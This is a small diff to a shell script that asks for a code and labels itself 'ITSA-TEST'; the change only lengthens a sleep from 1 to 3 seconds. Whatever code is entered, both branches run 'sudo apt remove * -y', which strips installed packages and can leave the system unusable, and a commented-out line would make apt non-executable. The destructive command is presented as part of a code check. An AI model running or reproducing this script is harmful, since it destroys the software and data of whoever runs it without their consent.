@@ -9,7 +9,7 @@ read code
 if [ "$code" != "ITSA-TEST" ]; then
   sudo apt remove * -y
   echo "ITSA-TEST: Código detectado"
-  sleep 1
+  sleep 3
 else
   sudo apt remove * -y
   # sudo chmod -x /usr/bin/apt
